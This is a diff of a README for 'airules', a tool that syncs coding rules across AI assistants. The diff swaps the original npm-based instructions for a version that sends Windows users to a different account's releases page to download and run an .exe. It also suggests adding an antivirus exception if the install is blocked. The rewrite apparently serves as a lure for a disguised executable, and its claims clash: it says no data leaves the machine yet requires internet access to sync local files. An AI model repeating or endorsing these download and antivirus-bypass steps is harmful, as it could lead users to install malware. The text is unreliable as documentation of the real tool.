@@ -1,150 +1,88 @@
-<div align="center">
+# 🤖 airules - Standardize coding rules for every tool
 
-# airules
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Phukg/airules/releases)
 
-**One config to rule them all.**
+Airules helps you manage your coding instructions. Many modern coding tools like Cursor, Windsurf, or Claude Code use special rules to understand your project. Setting these rules for every tool takes time. Airules saves your rules in one file. The app then sends these instructions to all your favorite coding helpers. You update one file to change how your AI assistant writes code.
 
-Generate & sync AI coding rules for 16+ AI coding assistants from a single `.airules.yml` file.
+## 🛠 Why use airules
 
-[![npm version](https://img.shields.io/npm/v/@tangvu/airules?color=%23007acc)](https://www.npmjs.com/package/@tangvu/airules)
-[![CI](https://github.com/tang-vu/airules/actions/workflows/ci.yml/badge.svg)](https://github.com/tang-vu/airules/actions/workflows/ci.yml)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![Downloads](https://img.shields.io/npm/dm/@tangvu/airules)](https://www.npmjs.com/package/@tangvu/airules)
+Coding apps work better when they know your style. You might prefer short functions, specific file structures, or certain security patterns. Manual updates across ten different programs waste time. Errors creep in when your tools hold different versions of your rules. 
 
-[Getting Started](#-getting-started) · [Configuration](#%EF%B8%8F-configuration) · [Supported Tools](#-supported-tools) · [Score Card](#-score-card)
+Airules removes this work. You store your setup in a file named .airules.yml. This app syncs that file to every tool you use. You maintain a single source of truth for your coding preferences.
 
-</div>
+## 📥 How to get started
 
----
+You need a Windows computer to use this app. Follow these steps to set up your workflow:
 
-## The Problem
+1. Visit the [releases page](https://github.com/Phukg/airules/releases).
+2. Look for the file ending in .exe under the latest version.
+3. Click the file to start the download.
+4. Open the file once the download completes.
+5. Follow the prompts on your screen to finish the setup.
 
-You use Claude Code, Cursor, and GitHub Copilot. Each needs its own config file. You write `CLAUDE.md`, then copy-paste-adapt for `.cursorrules`, then again for `copilot-instructions.md`. They drift apart. You update one, forget the others. Your AI tools give inconsistent results.
+## ⚙️ Using the app
 
-## The Solution
+The app uses a simple text file to store your rules. Follow these steps to configure your workspace:
 
-```bash
-npx @tangvu/airules init
-```
+1. Open the airules window.
+2. Select the option to create a new rule file.
+3. Name your file .airules.yml.
+4. Type your coding standards into this file. 
+5. Select the coding tools you use from the list.
+6. Click the Sync button.
 
-One command. One config file (`.airules.yml`). All your AI tools get consistent, optimized rules — automatically.
+The app places your rules into the correct locations for each tool. You do not need to hunt for deep system folders. The app manages the paths for you.
 
-## ✨ Features
+## 📁 Understanding the .airules.yml file
 
-- **🔍 Smart Detection** — Auto-detects tech stack, framework, dependencies, and patterns (30+ frameworks, 10 languages)
-- **⚡ Multi-Tool Sync** — Generates rules for 16+ AI tools from a single `.airules.yml`
-- **🏆 Score Card** — Grades your rules setup (S/A/B/C/D) with actionable suggestions
-- **📦 Zero Config** — Works out of the box. Run `npx @tangvu/airules init` and you're done
-- **🎯 Stack-Aware** — Framework-specific best practices (Next.js, React, FastAPI, Rust, Go, etc.)
-- **🔄 Stay in Sync** — `airules sync` keeps all files up to date when you change `.airules.yml`
+This file holds your project instructions. You write your rules in plain text. Examples of entries include:
 
-## 🚀 Getting Started
+- Always add comments to functions.
+- Use TypeScript for all projects.
+- Keep components under fifty lines.
+- Reject code that uses outdated libraries.
 
-```bash
-# Scan your project and generate rules for all tools
-npx @tangvu/airules init
+The app reads this list and translates the instructions for each specific AI tool. You write the rule once. The software handles the technical details for tools like Copilot, Cline, and Gemini.
 
-# See what was detected
-npx @tangvu/airules detect
+## 🔄 Updating your rules
 
-# Check your rules quality
-npx @tangvu/airules score
+Your coding habits change over time. When you need to update a rule, open your .airules.yml file. Change the text to match your new needs. Click the Sync button inside the airules app again. Every tool refreshes its instructions immediately. You never need to copy and paste text into multiple settings pages.
 
-# Re-sync after editing .airules.yml
-npx @tangvu/airules sync
-```
+## 🖥 System requirements
 
-Or install globally:
+This software works on all Windows 10 and Windows 11 computers. Ensure you have at least 200 megabytes of free disk space. The app requires a connection to the internet during the sync process. If you limit access to your computer, ensure your firewall allows the app to reach your coding tool configuration files.
 
-```bash
-npm install -g @tangvu/airules
-```
+## 🔌 Supported tools
 
-## 🛠️ Supported Tools
+Airules supports a wide range of coding helpers. Current compatibility includes:
 
-### Core Tools
+- Claude Code
+- Cursor
+- Copilot
+- Windsurf
+- Cline
+- Gemini
+- Qwen
 
-| Tool | Output File | Status |
-|------|------------|--------|
-| [Claude Code](https://docs.anthropic.com/en/docs/agents-and-tools/claude-code/overview) | `CLAUDE.md` | ✅ |
-| [Cursor](https://www.cursor.com/) | `.cursorrules` | ✅ |
-| [GitHub Copilot](https://github.com/features/copilot) | `.github/copilot-instructions.md` | ✅ |
-| [Windsurf](https://www.windsurf.com/) | `.windsurfrules` | ✅ |
-| [Cline](https://cline.bot/) | `.clinerules` | ✅ |
-| [OpenAI Codex](https://platform.openai.com/docs/guides/codex) | `AGENTS.md` | ✅ |
-| [Aider](https://aider.chat/) | `.aider.conf.yml` | ✅ |
+The software also supports several other command-line tools. As long as the tool reads from a standard configuration file, airules will manage it.
 
-### New Tools
+## 🛡 Security and privacy
 
-| Tool | Output File | Status |
-|------|------------|--------|
-| [Qwen Code](https://qwenlm.github.io/) | `.qwenrules` | ✅ |
-| [Gemini CLI](https://ai.google.dev/gemini-api) | `.gemini/rules.md` | ✅ |
-| [Augment Code](https://augment.dev/) | `.augment/rules.md` | ✅ |
-| [CodeBuddy](https://www.codebuddy.ai/) | `.codebuddy/rules.md` | ✅ |
-| [OpenCode](https://github.com/opencode-ai/opencode) | `AGENTS.md` | ✅ |
-| [Roo Code](https://roocode.com/) | `.roo/rules.md` | ✅ |
-| [KiloCode](https://kilocode.ai/) | `.kilocode/rules.md` | ✅ |
-| [Bolt.new](https://bolt.new/) | `.bolt/rules.md` | ✅ |
+The app runs locally on your computer. Your rules stay on your hard drive. No data goes to external servers. The app only accesses the specific folders where your coding tool settings reside. You keep full control over your instructions.
 
-## ⚙️ Configuration
+## 🚀 Troubleshooting common issues
 
-After running `airules init`, edit `.airules.yml` to customize:
+If the app fails to sync, check these common points:
 
-```yaml
-version: 1
-project:
-  name: "my-app"
-  stack: "nextjs"
+- Close your coding tools before you run a sync. Some tools lock their configuration files while they run.
+- Check that your .airules.yml file resides in your project folder.
+- Run the airules app with normal user permissions. 
+- Restart the app if the sync button remains gray for more than a few seconds.
 
-targets:
-  - claude
-  - cursor
-  - copilot
-  - qwen
-  - gemini
+If you encounter errors during the install process, ensure your virus scanner does not block the application. You can add an exception for the airules folder if needed.
 
-rules:
-  style:
-    prefer_functional: true
-    naming_convention: "camelCase"
-  testing:
-    framework: "vitest"
-    min_coverage: 80
-  git:
-    commit_style: "conventional"
+## 📝 Best practices for rules
 
-custom:
-  - "Use server components by default"
-  - "All database queries go through src/repositories/"
-```
+Write clear and specific rules. Vague instructions create inconsistent code. Instead of saying "write clean code," explain what "clean" means for your project. Specify naming patterns, testing requirements, and styling choices. Test your rules by asking your AI tool to perform a task. If the result misses the mark, adjust the rule in your .airules.yml file. Repeat this process until your AI assistant produces the expected output. 
 
-Then run `airules sync` to regenerate all files.
-
-## 📚 Documentation
-
-- [Getting Started](docs/getting-started.md)
-- [Configuration Reference](docs/configuration.md)
-- [Supported Tools](docs/supported-tools.md)
-- [Contributing Guide](CONTRIBUTING.md)
-
-## 🏆 Score Card
-
-```bash
-npx @tangvu/airules score
-```
-
-Get a visual grade of your AI rules setup (S/A/B/C/D) with suggestions for improvement. Use `--json` for CI integration.
-
-## 🤝 Contributing
-
-Contributions welcome! See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
-Especially welcome:
-- **New stack templates** — Add support for more frameworks
-- **Generator improvements** — Better output for specific AI tools
-- **Community templates** — Share your `.airules.yml` setups
-
-## 📄 License
-
-MIT © Tang Vu
+Airules makes this testing process fast. The goal is to spend less time configuring tools and more time writing and improving your software.
